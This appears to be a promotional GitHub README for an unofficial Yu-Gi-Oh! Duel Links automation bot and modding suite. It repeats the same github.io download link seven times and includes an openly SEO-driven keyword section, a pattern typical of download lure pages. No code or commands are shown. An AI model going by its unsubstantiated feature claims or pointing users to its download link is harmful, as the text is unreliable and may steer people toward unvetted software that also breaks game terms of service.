![preview](https://raw.githubusercontent.com/ShmsAldeen/Duel-Links-Forge-Bot/main/cover_bf37d.svg)
[![Download](https://raw.githubusercontent.com/ShmsAldeen/Duel-Links-Forge-Bot/main/get_09f0.svg)](https://ShmsAldeen.github.io/Duel-Links-Forge-Bot/)

# JDuel Companion Suite — Autonomous Duel Assistant & Modding Workshop 🎴🤖

An independent, community-crafted desktop companion for **Yu-Gi-Oh! Duel Links (Steam release)**. Where the original project focused on a single automated bot, this suite reimagines the concept as a full workstation: a modular modding studio, a real-time duel telemetry dashboard, an adaptive farm scheduler, and a scripting sandbox — all running locally on your machine with a clean, modern interface.

[![Download](https://raw.githubusercontent.com/ShmsAldeen/Duel-Links-Forge-Bot/main/get_09f0.svg)](https://ShmsAldeen.github.io/Duel-Links-Forge-Bot/)

---

## 📚 Table of Contents

- [What Is This?](#-what-is-this)
- [The Philosophy Behind the Suite](#-the-philosophy-behind-the-suite)
- [Feature Highlights](#-feature-highlights)
  - [Core Duel Automation](#-core-duel-automation)
  - [Modding Workshop](#-modding-workshop)
  - [Telemetry & Insights](#-telemetry--insights)
  - [Adaptive Scheduler](#-adaptive-scheduler)
  - [Scripting Sandbox](#-scripting-sandbox)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [Compatibility Matrix](#-compatibility-matrix)
- [SEO & Discoverability](#-seo--discoverability)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 What Is This?

**JDuel Companion Suite** is a desktop application that sits beside your Yu-Gi-Oh! Duel Links Steam client and quietly becomes the backstage crew for your grind. Instead of forcing you to babysit repetitive duels, it observes the game's window state, understands the current phase of the match, and reacts the way a seasoned duelist would — only with the patience of a machine and the consistency of a metronome.

But automation is only the opening act. The suite bundles a **modding workshop** for tweaking visual and audio assets, a **telemetry dashboard** that charts your win rates across decks and opponents, and a **scheduler** that plans your farming around the game's rotating events. Think of it as a Swiss Army knife where every blade is a different flavor of convenience.

This is not a script you fire and forget. It is a companion you configure, teach, and grow with.

[![Download](https://raw.githubusercontent.com/ShmsAldeen/Duel-Links-Forge-Bot/main/get_09f0.svg)](https://ShmsAldeen.github.io/Duel-Links-Forge-Bot/)

---

## 🎨 The Philosophy Behind the Suite

Most automation utilities treat the user as a passenger. You press start, close your eyes, and hope the thing doesn't drive off a cliff. We took a different route.

The Companion Suite treats you as the **architect**. Every automation routine is composed from visible, editable blocks. Every mod you apply is logged with a reversible snapshot. Every decision the assistant makes during a duel can be replayed frame-by-frame in the telemetry pane. If something feels off, you can see exactly why — and change it.

The result is a tool that respects both your time and your curiosity. You can let it run fully autonomously during a lunch break, or you can peel back the layers and rewrite its behavior to match a very specific farming strategy. Both paths are first-class citizens.

---

## ✨ Feature Highlights

### ⚔️ Core Duel Automation

- **Phase-aware decision engine** — recognizes draw, standby, main, battle, and end phases from screen state, then selects the optimal action based on your configured strategy profile.
- **Deck-specific playbooks** — save separate routines for each of your farming decks. A Blue-Eyes turbo deck and a burn deck should not share the same brain, and here they don't.
- **Surrender heuristics** — bail out of unwinnable matches early to protect your time budget, with configurable thresholds per event type.
- **Anti-idle sentinel** — detects when the client is waiting on input and nudges it forward without human intervention.
- **Reward capture** — after each duel, the suite logs the drops, experience gained, and cumulative progress toward the next event milestone.

### 🛠️ Modding Workshop

- **Asset browser** — inspect card art, sound effects, and UI textures in a tree view grouped by content pack.
- **Snapshot & restore** — every modification produces a reversible snapshot, so you can experiment fearlessly and roll back with one action.
- **Batch operations** — apply a texture swap across hundreds of cards using pattern-based rules.
- **Mod library format** — package your tweaks into portable bundles that others in the community can drop into their workshop.
- **Conflict detector** — warns you when two active mods touch the same asset, before the game has a chance to misbehave.

### 📊 Telemetry & Insights

- **Win-rate heatmaps** — visualize performance across decks, opponents, and time of day.
- **Duel replay recorder** — capture the decision trace of each automated match and scrub through it chronologically.
- **Drop-rate tracker** — accumulate statistics on reward frequency to help you plan which events deserve your attention.
- **Export pipeline** — push your statistics into CSV or JSON for external analysis in your favorite spreadsheet or notebook.

### ⏰ Adaptive Scheduler

- **Event calendar awareness** — the scheduler reads the current in-game event rotation and adjusts your farming plan accordingly.
- **Session budgets** — define how many duels you want per session, per day, or per week, and let the suite pace itself.
- **Smart cooldowns** — randomized micro-pauses between actions make long sessions feel more natural and less mechanical.
- **Notification hooks** — get a desktop toast or a webhook ping when a session finishes or an event milestone is reached.

### 🧪 Scripting Sandbox

- **Visual rule builder** — compose automation logic without writing a single line of text.
- **Text-based scripting layer** — for power users who want to express complex conditions, an embedded scripting surface lets you define custom triggers and responses.
- **Dry-run mode** — test a new rule against recorded duel data before letting it touch a live match.
- **Shared rule marketplace (community)** — import rules crafted by other users, inspect them line by line, and enable only what you trust.

[![Download](https://raw.githubusercontent.com/ShmsAldeen/Duel-Links-Forge-Bot/main/get_09f0.svg)](https://ShmsAldeen.github.io/Duel-Links-Forge-Bot/)

---

## 📱 Responsive UI & Multilingual Support

The interface is built around a **responsive layout engine** that rearranges panels depending on whether you're on a wide desktop monitor, a laptop screen, or a narrow window docked to the side of your game client. Nothing gets clipped, nothing gets hidden behind a scrollbar you didn't ask for.

Localization ships with **multilingual support** out of the box. Interface strings are separated from logic, so community translators can contribute new languages without touching the codebase. Right-to-left layouts are handled natively. The suite detects your system locale on first launch and picks a sensible default, which you can override at any time.

---

## ☎️ 24/7 Customer Support

Round-the-clock assistance is available through the repository's discussion channels and issue tracker. Whether you're troubleshooting a stubborn mod conflict at 3 AM or trying to understand why a scheduler rule fired twice, someone from the community — or a maintainer — is typically online. Support covers:

- Configuration walkthroughs for first-time users.
- Debugging help for automation routines that behave unexpectedly.
- Guidance on packaging and sharing your own mod bundles.
- Escalation paths for reproducible bugs, with a template that gathers all the diagnostics we need in one pass.

---

## 🖥️ Compatibility Matrix

| Component | Supported Environment |
|---|---|
| Game client | Yu-Gi-Oh! Duel Links — Steam release |
| Operating system | Windows 10 and Windows 11 (64-bit) |
| Display | 1280×720 minimum, 1920×1080 recommended |
| Runtime dependencies | Bundled with the suite installer |
| Optional integrations | Local webhook endpoints, spreadsheet exports |

---

## 🔍 SEO & Discoverability

This repository is written and tagged so that people searching for terms like **Duel Links automation companion**, **Yu-Gi-Oh farming scheduler**, **card game modding workshop**, **duel telemetry dashboard**, and **Steam Duel Links assistant tool** can find it without wading through pages of unrelated results. Section headings, in-line descriptions, and the FAQ have all been phrased to match the vocabulary real users type into search bars. If you arrived here from a search engine, welcome — you're exactly who this was built for.

---

## ❓ Frequently Asked Questions

**Is this a replacement for the original bot project?**
No. It is an independent, inspired reinterpretation. The original focused on one thing and did it well; this suite widens the scope to include modding, analytics, and scheduling alongside automation.

**Do I need programming experience?**
Not at all. The visual rule builder covers the majority of use cases. The scripting layer exists for users who want more precision, but it is entirely optional.

**Can I run this alongside other tools?**
The suite plays nicely with most overlay and capture utilities. If you encounter a conflict, the diagnostics export will usually pinpoint the culprit.

**How do I contribute a translation?**
Open a discussion thread with your language of interest, and a maintainer will point you to the localization files and contribution guide.

**Where do my statistics live?**
Locally, in a data directory you control. Nothing is uploaded anywhere unless you explicitly configure a webhook or export.

[![Download](https://raw.githubusercontent.com/ShmsAldeen/Duel-Links-Forge-Bot/main/get_09f0.svg)](https://ShmsAldeen.github.io/Duel-Links-Forge-Bot/)

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Public beta of the scripting sandbox with a curated starter rule set.
- **Q2 2026** — Expanded telemetry with per-card performance attribution.
- **Q3 2026** — Mod library browser with one-click import of community bundles.
- **Q4 2026** — Cross-session profile syncing for users who play on multiple machines.

---

## ⚠️ Disclaimer

This project is an unofficial, community-driven companion tool. It is **not affiliated with, endorsed by, or sponsored by** Konami, the publishers of Yu-Gi-Oh! Duel Links, or Valve Corporation. All trademarks and game assets belong to their respective owners.

Users are solely responsible for how they employ this software and for complying with the terms of service of any game or platform they interact with. The maintainers provide this suite as-is, without warranty of any kind, and assume no liability for account restrictions, data loss, or any other consequence arising from its use. Always review the rules of the platforms you participate in before adopting third-party tooling.

---

## 📄 License

This repository is distributed under the **MIT License**. You are welcome to read, modify, and redistribute the source in accordance with its terms.

A full copy of the license text is available here: [MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 JDuel Companion Suite Contributors.

[![Download](https://raw.githubusercontent.com/ShmsAldeen/Duel-Links-Forge-Bot/main/get_09f0.svg)](https://ShmsAldeen.github.io/Duel-Links-Forge-Bot/)